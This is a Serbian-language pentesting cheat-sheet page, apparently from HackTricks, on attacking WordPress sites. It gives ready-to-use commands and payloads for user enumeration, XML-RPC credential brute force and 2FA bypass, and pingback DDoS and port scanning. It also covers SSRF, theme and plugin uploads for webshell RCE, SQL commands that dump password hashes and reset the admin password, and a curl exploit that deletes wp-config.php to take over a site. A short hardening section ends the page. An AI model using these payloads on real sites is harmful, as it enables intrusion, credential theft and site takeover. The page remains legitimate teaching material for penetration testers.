# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

- **Uploaded** datoteke idu na: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Teme se mogu naÄ‡i u /wp-content/themes/,** tako da ako promenite neki php u temi da biste dobili RCE, verovatno Ä‡ete koristiti taj put. Na primer: KoristeÄ‡i **temu twentytwelve** moÅ¾ete **pristupiti** **404.php** datoteci u: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **JoÅ¡ jedan koristan URL moÅ¾e biti:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- U **wp-config.php** moÅ¾ete pronaÄ‡i root lozinku baze podataka.
- Podrazumevani putanje za prijavu koje treba proveriti: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Glavne WordPress datoteke**

- `index.php`
- `license.txt` sadrÅ¾i korisne informacije kao Å¡to je verzija WordPress-a koja je instalirana.
- `wp-activate.php` se koristi za proces aktivacije putem e-poÅ¡te prilikom postavljanja nove WordPress stranice.
- Folderi za prijavu (mogu biti preimenovani da bi se sakrili):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` je datoteka koja predstavlja funkciju WordPress-a koja omoguÄ‡ava prenos podataka putem HTTP-a kao transportnog mehanizma i XML-a kao mehanizma kodiranja. Ova vrsta komunikacije je zamenjena WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Folder `wp-content` je glavna direktorijum gde se Äuvaju dodaci i teme.
- `wp-content/uploads/` je direktorijum gde se Äuvaju sve datoteke koje su otpremljene na platformu.
- `wp-includes/` Ovo je direktorijum gde se Äuvaju osnovne datoteke, kao Å¡to su sertifikati, fontovi, JavaScript datoteke i dodaci.
- `wp-sitemap.xml` U WordPress verzijama 5.5 i veÄ‡im, WordPress generiÅ¡e XML datoteku mape sajta sa svim javnim postovima i javno upitnim tipovima postova i taksonomijama.

**Post eksploatacija**

- Datoteka `wp-config.php` sadrÅ¾i informacije potrebne WordPress-u za povezivanje sa bazom podataka, kao Å¡to su ime baze podataka, host baze podataka, korisniÄko ime i lozinka, kljuÄevi za autentifikaciju i soli, i prefiks tabela baze podataka. Ova konfiguraciona datoteka se takoÄ‘e moÅ¾e koristiti za aktiviranje DEBUG moda, Å¡to moÅ¾e biti korisno u reÅ¡avanju problema.

### Dozvole korisnika

- **Administrator**
- **Urednik**: Objavljuje i upravlja svojim i tuÄ‘im postovima
- **Autor**: Objavljuje i upravlja svojim postovima
- **Doprinosilac**: PiÅ¡e i upravlja svojim postovima, ali ih ne moÅ¾e objaviti
- **Pretplatnik**: Pregleda postove i ureÄ‘uje svoj profil

## **Pasivna enumeracija**

### **Dobijanje verzije WordPress-a**

Proverite da li moÅ¾ete pronaÄ‡i datoteke `/license.txt` ili `/readme.html`

Unutar **izvora koda** stranice (primer sa [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS link datoteke

![](<../../images/image (533).png>)

- JavaScript datoteke

### Preuzmi dodatke
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Preuzmi Teme
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Ekstraktovanje verzija uopÅ¡te
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktivna enumeracija

### Plugin-i i Teme

Verovatno neÄ‡ete moÄ‡i da pronaÄ‘ete sve moguÄ‡e Plugin-e i Teme. Da biste ih otkrili, moraÄ‡ete da **aktivno Brute Force-ujete listu Plugin-a i Tema** (na sreÄ‡u, postoje automatski alati koji sadrÅ¾e ove liste).

### Korisnici

- **ID Brute:** Dobijate validne korisnike sa WordPress sajta Brute Forcing-om ID-eva korisnika:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Ako su odgovori **200** ili **30X**, to znaÄi da je id **validan**. Ako je odgovor **400**, onda je id **nevalidan**.

- **wp-json:** TakoÄ‘e moÅ¾ete pokuÅ¡ati da dobijete informacije o korisnicima upitom:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
JoÅ¡ jedan `/wp-json/` krajnji taÄka koja moÅ¾e otkriti neke informacije o korisnicima je:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Napomena da ovaj krajnji taÄka izlaÅ¾e samo korisnike koji su napravili post. **Samo informacije o korisnicima koji imaju ovu funkciju omoguÄ‡enu Ä‡e biti pruÅ¾ene**.

TakoÄ‘e, napomena da **/wp-json/wp/v2/pages** moÅ¾e da otkrije IP adrese.

- **Enumeracija korisniÄkih imena za prijavu**: Kada se prijavljujete na **`/wp-login.php`**, **poruka** je **drugaÄija** u zavisnosti od toga da li je navedeno **korisniÄko ime postoji ili ne**.

### XML-RPC

Ako je `xml-rpc.php` aktivan, moÅ¾ete izvrÅ¡iti brute-force napad na kredencijale ili ga koristiti za pokretanje DoS napada na druge resurse. (MoÅ¾ete automatizovati ovaj proces[ koristeÄ‡i ovo](https://github.com/relarizky/wpxploit) na primer).

Da biste proverili da li je aktivan, pokuÅ¡ajte da pristupite _**/xmlrpc.php**_ i poÅ¡aljite ovaj zahtev:

**Proveri**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Bruteforce kredencijali**

**`wp.getUserBlogs`**, **`wp.getCategories`** ili **`metaWeblog.getUsersBlogs`** su neke od metoda koje se mogu koristiti za bruteforce kredencijale. Ako moÅ¾ete pronaÄ‡i neku od njih, moÅ¾ete poslati neÅ¡to poput:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Poruka _"PogreÅ¡no korisniÄko ime ili lozinka"_ unutar odgovora sa kodom 200 treba da se pojavi ako akreditivi nisu validni.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

KoriÅ¡Ä‡enjem ispravnih akreditiva moÅ¾ete da otpremite datoteku. U odgovoru Ä‡e se pojaviti putanja ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
TakoÄ‘e postoji **brÅ¾i naÄin** za brute-force kredencijale koristeÄ‡i **`system.multicall`** jer moÅ¾ete isprobati nekoliko kredencijala u istom zahtevu:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**ObilaÅ¾enje 2FA**

Ova metoda je namenjena programima, a ne ljudima, i stara je, stoga ne podrÅ¾ava 2FA. Dakle, ako imate vaÅ¾eÄ‡e kredencijale, ali je glavni ulaz zaÅ¡tiÄ‡en 2FA, **moÅ¾da Ä‡ete moÄ‡i da zloupotrebite xmlrpc.php da se prijavite sa tim kredencijalima obilaÅ¾eÄ‡i 2FA**. Imajte na umu da neÄ‡ete moÄ‡i da izvrÅ¡ite sve radnje koje moÅ¾ete da uradite putem konzole, ali moÅ¾da Ä‡ete i dalje moÄ‡i da doÄ‘ete do RCE-a kao Å¡to Ippsec objaÅ¡njava u [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS ili skeniranje portova**

Ako moÅ¾ete pronaÄ‡i metodu _**pingback.ping**_ unutar liste, moÅ¾ete naterati Wordpress da poÅ¡alje proizvoljan zahtev bilo kojem hostu/portu.\
Ovo se moÅ¾e koristiti da se zatraÅ¾i **hiljade** Wordpress **sajtova** da **pristupe** jednoj **lokaciji** (tako da se izazove **DDoS** u toj lokaciji) ili moÅ¾ete to koristiti da naterate **Wordpress** da **skanira** neku internu **mreÅ¾u** (moÅ¾ete naznaÄiti bilo koji port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

Ako dobijete **faultCode** sa vrednoÅ¡Ä‡u **veÄ‡om** od **0** (17), to znaÄi da je port otvoren.

Pogledajte koriÅ¡Ä‡enje **`system.multicall`** u prethodnom odeljku da biste nauÄili kako da zloupotrebite ovu metodu za izazivanje DDoS-a.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Ova datoteka obiÄno postoji u korenu Wordpress sajta: **`/wp-cron.php`**\
Kada se ova datoteka **pristupi**, izvrÅ¡ava se "**teÅ¡ka**" MySQL **upit**, tako da bi mogla biti koriÅ¡Ä‡ena od strane **napadaÄa** da **uzrokuje** **DoS**.\
TakoÄ‘e, po defaultu, `wp-cron.php` se poziva pri svakom uÄitavanju stranice (svaki put kada klijent zatraÅ¾i neku Wordpress stranicu), Å¡to na sajtovima sa visokim prometom moÅ¾e izazvati probleme (DoS).

PreporuÄuje se da se onemoguÄ‡i Wp-Cron i da se kreira pravi cronjob unutar hosta koji izvrÅ¡ava potrebne radnje u redovnim intervalima (bez izazivanja problema).

### /wp-json/oembed/1.0/proxy - SSRF

PokuÅ¡ajte da pristupite _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ i Wordpress sajt moÅ¾e da poÅ¡alje zahtev ka vama.

Ovo je odgovor kada ne funkcioniÅ¡e:

![](<../../images/image (365).png>)

## SSRF

{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

Ovaj alat proverava da li **methodName: pingback.ping** postoji za putanju **/wp-json/oembed/1.0/proxy** i ako postoji, pokuÅ¡ava da ih iskoristi.

## Automatic Tools
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Dobijanje pristupa prepisivanjem bita

ViÅ¡e od pravog napada, ovo je radoznalost. U CTF-u [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) mogli ste da prebacite 1 bit iz bilo kog wordpress fajla. Tako ste mogli da prebacite poziciju `5389` fajla `/var/www/html/wp-includes/user.php` da NOP-ujete NOT (`!`) operaciju.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modifikovanje php iz teme koja se koristi (potrebne admin kredencijale)**

Izgled â†’ Urednik teme â†’ 404 Å ablon (s desne strane)

Promenite sadrÅ¾aj za php shell:

![](<../../images/image (384).png>)

PretraÅ¾ite internet kako moÅ¾ete pristupiti toj aÅ¾uriranoj stranici. U ovom sluÄaju morate pristupiti ovde: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

MoÅ¾ete koristiti:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP plugin

MoÅ¾da je moguÄ‡e uploadovati .php fajlove kao plugin.\
Kreirajte svoj php backdoor koristeÄ‡i, na primer:

![](<../../images/image (183).png>)

Zatim dodajte novi plugin:

![](<../../images/image (722).png>)

Uploadujte plugin i pritisnite Install Now:

![](<../../images/image (249).png>)

Kliknite na Procced:

![](<../../images/image (70).png>)

Verovatno ovo neÄ‡e uÄiniti niÅ¡ta oÄigledno, ali ako odete na Media, videÄ‡ete vaÅ¡ shell uploadovan:

![](<../../images/image (462).png>)

Pristupite mu i videÄ‡ete URL za izvrÅ¡avanje reverse shell-a:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Ova metoda ukljuÄuje instalaciju malicioznog plugina za koji se zna da je ranjiv i moÅ¾e se iskoristiti za dobijanje web shell-a. Ovaj proces se sprovodi kroz WordPress kontrolnu tablu na sledeÄ‡i naÄin:

1. **Plugin Acquisition**: Plugin se dobija iz izvora kao Å¡to je Exploit DB kao [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- Idite na WordPress kontrolnu tablu, zatim idite na `Dashboard > Plugins > Upload Plugin`.
- Uploadujte zip fajl preuzetog plugina.
3. **Plugin Activation**: Kada je plugin uspeÅ¡no instaliran, mora se aktivirati kroz kontrolnu tablu.
4. **Exploitation**:
- Sa instaliranim i aktiviranim pluginom "reflex-gallery", moÅ¾e se iskoristiti jer je poznato da je ranjiv.
- Metasploit framework pruÅ¾a exploit za ovu ranjivost. UÄitajte odgovarajuÄ‡i modul i izvrÅ¡ite specifiÄne komande da biste uspostavili meterpreter sesiju, Å¡to omoguÄ‡ava neovlaÅ¡Ä‡en pristup sajtu.
- Napominje se da je ovo samo jedna od mnogih metoda za iskoriÅ¡Ä‡avanje WordPress sajta.

SadrÅ¾aj ukljuÄuje vizuelne prikaze koraka u WordPress kontrolnoj tabli za instalaciju i aktivaciju plugina. MeÄ‘utim, vaÅ¾no je napomenuti da je iskoriÅ¡Ä‡avanje ranjivosti na ovaj naÄin ilegalno i neetiÄno bez odgovarajuÄ‡e dozvole. Ove informacije treba koristiti odgovorno i samo u legalnom kontekstu, kao Å¡to je pentesting sa izriÄitom dozvolom.

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ je skripta dizajnirana da eskalira **Cross-Site Scripting (XSS)** ranjivost na **Remote Code Execution (RCE)** ili druge kritiÄne ranjivosti u WordPress-u. Za viÅ¡e informacija pogledajte [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). PruÅ¾a **podrÅ¡ku za Wordpress verzije 6.X.X, 5.X.X i 4.X.X i omoguÄ‡ava:**
- _**Privilege Escalation:**_ Kreira korisnika u WordPress-u.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ Uploadujte svoj prilagoÄ‘eni plugin (backdoor) u WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Uredite ugraÄ‘ene plugine u WordPress-u.
- _**(RCE) Built-In Theme Edit:**_ Uredite ugraÄ‘ene teme u WordPress-u.
- _**(Custom) Custom Exploits:**_ PrilagoÄ‘eni exploits za treÄ‡e strane WordPress plugine/teme.

## Post Exploitation

Izvucite korisniÄka imena i lozinke:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
Promenite administratorsku lozinku:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Attack Surface

Znanje o tome kako Wordpress dodatak moÅ¾e izloÅ¾iti funkcionalnost je kljuÄno za pronalaÅ¾enje ranjivosti u njegovoj funkcionalnosti. MoÅ¾ete pronaÄ‡i kako dodatak moÅ¾e izloÅ¾iti funkcionalnost u sledeÄ‡im taÄkama i neke primere ranjivih dodataka u [**ovom blog postu**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Jedan od naÄina na koji dodatak moÅ¾e izloÅ¾iti funkcije korisnicima je putem AJAX handler-a. Ovi handler-i mogu sadrÅ¾ati logiku, greÅ¡ke u autorizaciji ili autentifikaciji. Å taviÅ¡e, Äesto se deÅ¡ava da Ä‡e ove funkcije zasnivati i autentifikaciju i autorizaciju na postojanju Wordpress nonce-a koji **bilo koji korisnik autentifikovan u Wordpress instanci moÅ¾e imati** (nezavisno od njegove uloge).

Ovo su funkcije koje se mogu koristiti za izlaganje funkcije u dodatku:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**KoriÅ¡Ä‡enje `nopriv` Äini krajnju taÄku dostupnom svim korisnicima (Äak i neautentifikovanim).**

> [!CAUTION]
> Pored toga, ako funkcija samo proverava autorizaciju korisnika pomoÄ‡u funkcije `wp_verify_nonce`, ova funkcija samo proverava da li je korisnik prijavljen, obiÄno ne proverava ulogu korisnika. Tako da korisnici sa niskim privilegijama mogu imati pristup akcijama sa visokim privilegijama.

- **REST API**

TakoÄ‘e je moguÄ‡e izloÅ¾iti funkcije iz WordPress-a registrujuÄ‡i REST AP koristeÄ‡i funkciju `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
`permission_callback` je povratna funkcija koja proverava da li je dati korisnik ovlaÅ¡Ä‡en da pozove API metodu.

**Ako se koristi ugraÄ‘ena funkcija `__return_true`, jednostavno Ä‡e preskoÄiti proveru korisniÄkih dozvola.**

- **Direktan pristup php datoteci**

Naravno, WordPress koristi PHP i datoteke unutar dodataka su direktno dostupne sa veba. Dakle, u sluÄaju da dodatak izlaÅ¾e bilo koju ranjivu funkcionalnost koja se aktivira jednostavnim pristupom datoteci, biÄ‡e eksploatabilna od strane bilo kog korisnika.

### Neautentifikovano proizvoljno brisanje datoteka putem wp_ajax_nopriv (Litho Tema <= 3.0)

WordPress teme i dodaci Äesto izlaÅ¾u AJAX rukovaoce putem `wp_ajax_` i `wp_ajax_nopriv_` hook-ova. Kada se koristi varijanta **_nopriv_**, **povratna funkcija postaje dostupna neautentifikovanim posetiocima**, tako da svaka osetljiva akcija mora dodatno implementirati:

1. Proveru **kapaciteta** (npr. `current_user_can()` ili barem `is_user_logged_in()`), i
2. **CSRF nonce** validiran sa `check_ajax_referer()` / `wp_verify_nonce()`, i
3. **Strogu sanitizaciju / validaciju unosa**.

Litho multipurpose tema (< 3.1) je zaboravila ta 3 kontrola u funkciji *Remove Font Family* i zavrÅ¡ila je sa slanjem sledeÄ‡eg koda ( pojednostavljeno):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemi koje uvodi ovaj deo koda:

* **Neautentifikovani pristup** â€“ `wp_ajax_nopriv_` hook je registrovan.
* **Nema nonce / provere sposobnosti** â€“ bilo koji posetilac moÅ¾e da pristupi kraju.
* **Nema sanitizacije putanje** â€“ string `fontfamily` koji kontroliÅ¡e korisnik se konkatenira sa putanjom do datoteÄnog sistema bez filtriranja, Å¡to omoguÄ‡ava klasiÄnu `../../` traversalu.

#### Eksploatacija

NapadaÄ moÅ¾e obrisati bilo koju datoteku ili direktorijum **ispod osnovnog direktorijuma za upload** (obiÄno `<wp-root>/wp-content/uploads/`) slanjem jednog HTTP POST zahteva:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
Zato Å¡to `wp-config.php` Å¾ivi van *uploads*, Äetiri `../` sekvence su dovoljne na podrazumevanoj instalaciji. Brisanje `wp-config.php` prisiljava WordPress da uÄ‘e u *Äarobnjaka za instalaciju* pri sledeÄ‡em posetu, omoguÄ‡avajuÄ‡i potpunu preuzimanje sajta (napadaÄ samo unosi novu DB konfiguraciju i kreira admin korisnika).

Ostali znaÄajni ciljevi ukljuÄuju plugin/theme `.php` datoteke (da bi se prekinuli sigurnosni pluginovi) ili `.htaccess` pravila.

#### Lista za detekciju

* Bilo koji `add_action( 'wp_ajax_nopriv_...')` povratni poziv koji poziva pomoÄ‡ne funkcije za datoteÄni sistem (`copy()`, `unlink()`, `$wp_filesystem->delete()`, itd.).
* Konkatenacija neproÄiÅ¡Ä‡enog korisniÄkog unosa u putanje (traÅ¾ite `$_POST`, `$_GET`, `$_REQUEST`).
* Odsustvo `check_ajax_referer()` i `current_user_can()`/`is_user_logged_in()`.

#### OjaÄavanje
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// â€¦ proceed â€¦
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  ğŸ”’  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Uvek** tretirajte svaku operaciju pisanja/brisanja na disku kao privilegovanu i dvostruko proverite:
> â€¢ Autentifikacija  â€¢ Autorizacija  â€¢ Nonce  â€¢ Sanitizacija ulaza  â€¢ OgraniÄenje putanje (npr. putem `realpath()` plus `str_starts_with()`).

---

## WordPress zaÅ¡tita

### Redovne aÅ¾uriranja

Proverite da li su WordPress, dodaci i teme aÅ¾urirani. TakoÄ‘e potvrdite da je automatsko aÅ¾uriranje omoguÄ‡eno u wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
TakoÄ‘e, **instalirajte samo pouzdane WordPress dodatke i teme**.

### Bezbednosni dodaci

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Ostale preporuke**

- Uklonite podrazumevanog **admin** korisnika
- Koristite **jake lozinke** i **2FA**
- PeriodiÄno **proveravajte** dozvole korisnika
- **OgraniÄite pokuÅ¡aje prijavljivanja** kako biste spreÄili Brute Force napade
- Preimenujte **`wp-admin.php`** datoteku i dozvolite pristup samo interno ili sa odreÄ‘enih IP adresa.

## Reference

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)

{{#include ../../banners/hacktricks-training.md}}
